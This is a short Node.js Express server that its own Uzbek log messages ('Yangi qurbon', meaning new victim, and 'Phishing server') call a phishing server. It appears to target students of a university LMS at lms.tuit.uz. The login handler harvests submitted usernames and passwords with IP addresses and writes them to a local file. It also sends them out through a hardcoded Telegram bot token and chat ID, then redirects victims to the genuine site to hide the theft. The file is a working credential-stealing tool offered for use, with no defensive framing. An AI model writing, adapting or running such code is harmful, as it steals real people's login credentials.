const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = 3000;
const token = '8576588701:AAF8vKw-BkgvNURxXuk8xYhpNylBbQt6md8';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/login', (req, res) => {
    const { login, password } = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    const time = new Date().toISOString();

    const log = `[${time}] IP: ${ip} | User: ${login} | Pass: ${password}\n`;

    fs.appendFileSync('logs.txt', log);
    console.log('Yangi qurbon:', login, password);
    urls = `https://api.telegram.org/bot${token}/sendMessage?chat_id=7919434539&text=${encodeURIComponent(`Yangi qurbon:\n[${time}]\nUser: ${login}\nPass: ${password}`)}`;
    fetch(urls)
    .then(res => console.log('Xabar yuborildi'))
    .catch(err => console.error('Xabar yuborishda xato:', err));

    res.redirect('https://lms.tuit.uz/dashboard/news');
});

app.listen(PORT, () => {
    console.log(`Phishing server ishlamoqda → http://localhost:${PORT}`);
    console.log('Ctrl+C bilan to‘xtating');
});

